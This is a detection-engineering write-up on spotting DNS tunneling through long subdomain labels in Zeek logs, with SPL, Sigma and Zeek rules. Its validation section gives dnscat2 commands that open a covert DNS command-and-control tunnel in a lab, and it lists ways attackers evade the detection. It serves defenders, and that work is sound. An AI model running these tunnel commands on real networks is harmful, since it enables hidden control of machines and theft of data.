# DNS Tunneling via High-Entropy Subdomains

## Goal

Detect data exfiltration or C2 communication encoded in DNS query subdomains. Adversaries abuse DNS because it is rarely blocked outright and often poorly monitored, making it a reliable covert channel even in restricted environments.

## ATT&CK Categorization

- **Tactic:** TA0011 — Command and Control
- **Technique:** T1071.004 — Application Layer Protocol: DNS
- **Related:** TA0010 — Exfiltration (T1048 — Exfiltration Over Alternative Protocol)

## Strategy Abstract

DNS tunneling tools (iodine, dnscat2, DNSExfiltrator) encode data as subdomains of an attacker-controlled domain. The encoded subdomains are typically long, high-entropy strings that look nothing like legitimate hostnames. This detection looks for DNS queries where the subdomain component exceeds a length threshold and carries high Shannon entropy — a combination that rarely appears in normal DNS traffic but is characteristic of encoded payloads.

Secondary signals: unusually high query volume to a single parent domain, consistent query intervals (C2 beaconing), and query types other than A/AAAA (TXT and CNAME records are commonly abused for tunneling).

## Technical Context

**Data source:** Zeek `dns.log` ingested into Splunk (Corelight or Zeek App for Splunk). Sourcetype: `corelight_dns` or `bro_dns`.

**Key fields:**
- `query` — the full DNS query string; subdomain extraction and entropy calculation are applied here
- `qtype_name` — query type; TXT queries to external domains are elevated risk
- `answers` — DNS response; unusually large TXT responses are a corroborating signal
- `id.orig_h` — source host; used to identify the beaconing endpoint

**Environment assumptions:**
- Zeek is deployed at a network chokepoint with visibility into DNS queries (recursive resolver traffic or mirrored upstream)
- Zeek logs are forwarded to Splunk; the SPL below uses `len()` for subdomain length — entropy scoring requires either a custom SPL command or pre-computed field at ingestion
- An internal domain lookup or allowlist (e.g., a Splunk lookup table) exists to suppress known-good high-entropy domains (CDNs, cloud providers)

## Blind Spots

- **Low-and-slow tunneling:** Adversaries who keep query volume below the threshold and spread queries over long windows will evade volume-based components. Entropy detection still applies but is easier to tune around.
- **Encrypted DNS (DoH/DoT):** If clients resolve via DNS-over-HTTPS, Zeek dns.log won't see the queries. Requires separate visibility (proxy logs, EDR DNS telemetry).
- **Legitimate high-entropy domains:** Some CDN and cloud providers (Akamai, AWS, Azure) use long random-looking subdomains. Without a tuned allowlist this generates significant FP volume.
- **FQDN length limits as a bypass:** Adversaries can split payloads into multiple shorter subdomains per query, keeping each component below the length threshold while still exfiltrating data.

## False Positives

| False Positive | Triage Guidance |
|---|---|
| CDN subdomains (Akamai, CloudFront, Fastly) | Check parent domain against CDN provider ranges; add confirmed CDN domains to allowlist |
| Software update checks (Microsoft, Apple, Google) | Cross-reference parent domain against known update infrastructure; volume will be low and consistent across many hosts |
| Security tooling (EDR heartbeats, threat intel feeds) | Identify by source host — should be consistent, low-volume, and limited to known internal tooling hosts |
| GUID-based hostnames in internal infrastructure | Scope by queried domain — if parent domain is internal/owned, suppress |

## Validation

Using [dnscat2](https://github.com/iagox86/dnscat2) in a lab environment:

```bash
# Server side (attacker-controlled resolver)
ruby dnscat2.rb --dns "domain=tunnel.lab.local"

# Client side (victim host in lab)
./dnscat --dns "domain=tunnel.lab.local"
```

Expected result in Splunk: events from sourcetype `corelight_dns` or `bro_dns` where the first label of `query` is long and the query type is TXT or NULL, sourced from a single internal host at elevated rate.

**SPL (primary):**
```spl
sourcetype=corelight_dns OR sourcetype=bro_dns
| eval subdomain=mvindex(split(query, "."), 0)
| eval subdomain_len=len(subdomain)
| where subdomain_len > 40
    AND (qtype_name="TXT" OR qtype_name="NULL" OR qtype_name="CNAME")
| eval parent_domain=mvjoin(mvindex(split(query, "."), 1, -1), ".")
| lookup dns_allowlist.csv domain AS parent_domain OUTPUT is_allowed
| where isnull(is_allowed) OR is_allowed!="true"
| stats count, values(query) AS queries, dc(query) AS unique_queries
    BY _time, id.orig_h, parent_domain
| where count > 20
| sort - count
```

> **Note on entropy:** SPL does not have a native Shannon entropy function. Options: (1) compute entropy in a Zeek script and forward it as a field, (2) use a custom SPL command, or (3) use subdomain length as a proxy — imperfect but effective for catching most tooling. Length > 40 characters catches iodine, dnscat2, and DNSExfiltrator default configurations.

**Sigma rule (SIEM-agnostic source of truth):**
```yaml
title: DNS Tunneling via High-Entropy Subdomains
id: a8f3b2c1-4d5e-6f7a-8b9c-0d1e2f3a4b5c
status: experimental
description: Detects DNS queries with long subdomain labels indicative of data encoding used in DNS tunneling tools
references:
    - https://attack.mitre.org/techniques/T1071/004/
author: Chris Ray
date: 2026-04-29
tags:
    - attack.command-and-control
    - attack.t1071.004
    - attack.exfiltration
    - attack.t1048
logsource:
    category: dns
product: zeek
detection:
    selection:
        qtype_name:
            - TXT
            - NULL
            - CNAME
    filter_internal:
        query|endswith:
            - '.internal.corp'
            - '.local'
    condition: selection and not filter_internal
falsepositives:
    - CDN providers with long random subdomains (Akamai, CloudFront)
    - Software update infrastructure
level: medium
```

> The Sigma rule transpiles to SPL via `sigma-cli` with the Splunk backend. The SPL above adds length filtering and volume aggregation that go beyond what Sigma's condition syntax supports — treat the SPL as the production query and the Sigma rule as the portable definition.

**Zeek inline script (sensor-side pre-filter):**
```zeek
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    local labels = split_string(query, /\./);
    if ( |labels| > 2 )
        {
        local subdomain = labels[0];
        if ( |subdomain| > 40 )
            NOTICE([$note=DNS::HighEntropySubdomain,
                    $conn=c,
                    $msg=fmt("Long subdomain in DNS query: %s", query)]);
        }
    }
```

## Response

1. Identify the source host (`id.orig_h`) and isolate if query volume is high or data exfiltration is suspected
2. Enumerate all DNS queries from that host in the same window — look for consistent parent domain and query type pattern
3. Check whether the queried parent domain resolves to an attacker-controlled authoritative nameserver (passive DNS, threat intel lookup)
4. If confirmed tunneling: capture full PCAP for the host if available, escalate to IR, revoke network access
5. If uncertain: flag for analyst review, compare against endpoint telemetry for corroborating process/network activity

## References

- [Palantir ADS Framework](https://github.com/palantir/alerting-and-detection-strategy-framework)
- [MITRE ATT&CK T1071.004](https://attack.mitre.org/techniques/T1071/004/)
- [dnscat2](https://github.com/iagox86/dnscat2)
- [Detecting DNS Tunneling — Cisco Umbrella](https://umbrella.cisco.com/blog/network-attacks-dns-tunneling-detection-prevention)
- [Shannon entropy for DNS anomaly detection — SANS ISC](https://isc.sans.edu/diary/Detecting+DNS+Tunneling/19429)
